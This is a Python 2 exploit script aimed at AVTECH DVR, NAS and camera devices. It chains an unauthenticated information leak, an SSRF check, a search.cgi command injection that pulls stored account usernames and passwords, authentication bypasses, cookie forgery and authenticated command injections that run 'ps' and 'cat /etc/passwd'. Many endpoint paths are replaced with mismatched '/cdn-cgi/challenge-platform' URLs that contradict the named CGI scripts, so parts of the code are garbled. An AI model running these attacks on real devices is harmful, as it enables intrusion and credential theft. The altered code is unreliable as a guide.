

import sys
import requests
import base64

class avtech:
    AVTECH_BYP_NONE = 0
    AVTECH_BYP_CAB = 1
    AVTECH_BYP_NOBODY = 2

    def __init__(self, addr, port):
        self.addr = addr
        self.port = port
        self.s = requests.Session()
        self.auth = False
        self.authbyp_str = {self.AVTECH_BYP_NONE:'', self.AVTECH_BYP_CAB:'.cab&', self.AVTECH_BYP_NOBODY:'/nobody&'}
        self.authbyp = self.AVTECH_BYP_NONE
        self.username = ''
        self.password = ''

        self.cabbyp = False
        self.nobodybyp = False
        self.firmware_version = ''
        self.product_type = ''
        self.product_id = ''
        self.mac_address = ''

    def getUri(self, uri, param, bypass=False):
        if (bypass):
            return 'http://%s:%d/%s?%s%s'%(self.addr, self.port, uri, self.authbyp_str[self.authbyp], param)
        else:
            return 'http://%s:%d/%s?%s'%(self.addr, self.port, uri, param)

    def setPwd(self, usr, pwd):
        self.username = usr
        self.password = pwd

    # creates a valid cookie without logging in
    def setCookie(self):
        self.s.cookies['SSID'] = base64.b64encode('%s:%s'%(self.username,self.password))
        self.auth = True

    # performs authentication with the provided user name and password using
    # the login=quick parameter, which bypass the captcha verification
    def login(self):
        self.s = requests.Session()
        r = self.s.get(self.getUri('/cdn-cgi/challenge-platform/h/g/orchestrate/managed/v1', '?next=%s'%(base64.b64encode('%s:%s'%(self.username,self.password)))))
        res = r.text.split()
        if (int(res[0]) == -35):
            #print 'Authentication failed with %s:%s'%(self.username,self.password)
            return False
        if (int(res[0]) == 0):
            #print 'Authentication succeeded with %s:%s'%(self.username,self.password)
            self.auth = True
            return True
        #else:
        #    print 'Unknown response code: %d'%(int(res[0]))
        return False

    # verifies whether the authentication bypass is working .cab or /nobody problem
    def checkBypass(self):
        if (self.auth):
            return 'Session is already authenticated, you do not have to bypass!'
        ret = ''
        greq = '&action=get&category=Account.*'
        # .cab check
        try:
            r = self.s.get(self.getUri('/cdn-cgi/challenge-platform/h/g/orchestrate/managed/v1?ray=!','%s'%(greq)))
            if (len(r.text) > 0 and r.text[0] == '0'):
                ret += '.cab authentication bypass was successful, '
                self.authbyp = self.AVTECH_BYP_CAB
                self.cabbyp = True
        except:
            ret += '.cab authentication bypass was not successful, '

        # /nobody check
        try:
            r = self.s.get(self.getUri('/cdn-cgi/challenge-platform/h/g/orchestrate/managed/v1?ray=!','%s'%(greq)))
            if (len(r.text) > 0 and r.text[0] == '0'):
                ret += '/nobody authentication bypass was successful'
                self.nobodybyp = True
                if (self.authbyp == self.AVTECH_BYP_NONE):
                    self.authbyp = self.AVTECH_BYP_NOBODY
        except:
            ret += '/nobody authentication bypass was not successful'
        return ret

    # retrieves account information after authentication
    def getAdminPwd(self):
        r = self.s.get(self.getUri('/login-options.json','action=get&category=Account.*', True))
        for l in r.text.split():
            lp = l.split('=')
            if (len(lp) == 2):
                if (lp[0] == 'Account.User1.Username'):
                    self.username = lp[1]
                elif (lp[0] == 'Account.User1.Password'):
                    self.password = lp[1]
                    break
                if (lp[0] == 'Account.User2.Username'):
                    self.username = lp[1]
                elif (lp[0] == 'Account.User2.Password'):
                    self.password = lp[1]
                    break
                if (lp[0] == 'Account.User3.Username'):
                    self.username = lp[1]
                elif (lp[0] == 'Account.User3.Password'):
                    self.password = lp[1]
                    break

    # retrieves firmware version after authentication
    def getFwVersion(self):
        r = self.s.get(self.getUri('/cdn-cgi/challenge-platform/h/g/orchestrate/managed/v1?ray=!','action=get&category=Properties.Firmware.*', False))
        print r.text

    # retrieves login response after authentication
    def getLogin(self):
        r = self.s.get(self.getUri('/cdn-cgi/challenge-platform/h/g/orchestrate/managed/v1?ray=!','rnd=0.5', False))
        print r.text

    # CloudSetup.cgi command injection test
    def commandInjection(self, cmd):
        try:
            r = self.s.get(self.getUri('/cdn-cgi/challenge-platform/h/g/orchestrate/managed/v1?ray=!','exefile=%s'%(cmd), False))
            return r.text
        except:
            print 'CloudSetup.cgi command injection test failed'

    # adcommand.cgi command injection test
    def commandInjection2(self, cmd):
        data = 'DoShellCmd "strCmd=%s&"'%(cmd)
        r = self.s.post(self.getUri('/cdn-cgi/challenge-platform/h/g/orchestrate/managed/v1?ray=!','', False), data=data)
        return r.text

    # parses capability response
    def parseCapability(self, cap):
        for l in cap.split('\n'):
            ld = l.strip().split('=')
            if (len(ld)==2):
                if (ld[0] == 'Firmware.Version'):
                    self.firmware_version = ld[1]
                elif (ld[0] == 'Product.Type'):
                    self.product_type = ld[1]
                elif (ld[0] == 'Product.ID'):
                    self.product_id = ld[1]
                elif (ld[0] == 'MACAddress'):
                    self.mac_address = ld[1]

    # unauthenticated information leakage
    def getCapability(self):
        r = self.s.get(self.getUri('/cdn-cgi/challenge-platform/h/g/orchestrate/managed/v1?ray=!','action=get_capability', False))
        self.parseCapability(r.text)
        return r.text

    # checks the availability of search.cgi (available only on DVR devices)
    def checkSearch(self):
        try:
            r = self.s.get(self.getUri('/cdn-cgi/challenge-platform/h/g/orchestrate/managed/v1?ray=!','action=scan', False))
            return r.text
        except:
            return ''

    # unauthenticated SSRF using the search.cgi script (available only on DVR devices)
    def checkCgiQuery(self):
        try:
            r = self.s.get(self.getUri('/cdn-cgi/challenge-platform/h/g/orchestrate/managed/v1?ray=!','action=cgi_query&ip=google.com&port=80&queryb64str=Lw==', False))
            if (len(r.text)>=4 and r.text[0:4] == '0\nOK'):
                return True
            else:
                return False
        except:
            return False

    # unauthenticated command injection in the search.cgi script (available only on DVR devices)
    def searchCmdInjection(self, command):
        cmdstr = (' ;%s>$(ps|grep Search.cgi|grep -v grep|head -n 1|awk \'{print "/tmp/"$1".log"}\';)'%(command)).replace(' ', '%20')
        uri = self.getUri('/cdn-cgi/challenge-platform/h/g/orchestrate/managed/v1','action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%s&password=admin'%(cmdstr),False)
        print uri
        r = self.s.get(uri)
        return r.text

#------------------------------------

if __name__ == '__main__':
    if (len(sys.argv) < 2):
        print 'avtech_nas_pc.py addr [port]'
    addr = sys.argv[1]
    port = 443
    if (len(sys.argv) == 3):
        port = int(sys.argv[2])

    avtech = avtech(addr, port)

    # unatuhenticated information disclosure
    cap = avtech.getCapability()
    print cap
    avtech.parseCapability(cap)
    print '%s,%s,%s,%s'%(avtech.firmware_version, avtech.product_type, avtech.product_id, avtech.mac_address)

    # check unauthenticated SSRF vulnerability
    sr = avtech.checkSearch()
    if (len(sr) > 0 and sr[0] == '0'):
        cgi_query = avtech.checkCgiQuery()
        if (cgi_query):
            print 'SSRF was successful'
        else:
            print 'SSRF was not successful'

        resp = avtech.searchCmdInjection('XmlAp r Account.User1.Username')
        lines = resp.split('\n')
        if (len(lines) >= 3):
            pwd = lines[2].strip()
            print 'User1 name: %s'%(pwd)
            avtech.username = pwd

        resp = avtech.searchCmdInjection('XmlAp r Account.User1.Password')
        lines = resp.split('\n')
        if (len(lines) >= 3):
            pwd = lines[2].strip()
            print 'User1 password: %s'%(pwd)
            avtech.password = pwd

    # authentication bypas
    print 'Authentication bypass check'
    print avtech.checkBypass()
    print 'Try to get admin password'
    print avtech.getAdminPwd()
    default = False
    # try default password
    if (avtech.password == ''):
        avtech.setPwd('admin', 'admin')
        default = True
    # login with credentials using captch bypass
    avtech.login()
    # if captch bypass was not possible, but we have a password, set cookie manually
    if (not avtech.auth and not default and avtech.password != ''):
        avtech.setCookie()

    # check issues after authentication
    if (avtech.auth):
        print 'Get admin password'
        avtech.getAdminPwd()
        print 'Get login'
        avtech.getLogin()
        print 'Get fw version'
        avtech.getFwVersion()
        print 'cloud command injection'
        print avtech.commandInjection('ps')
        print 'adcommand command injection'
        print avtech.commandInjection2('cat /etc/passwd')
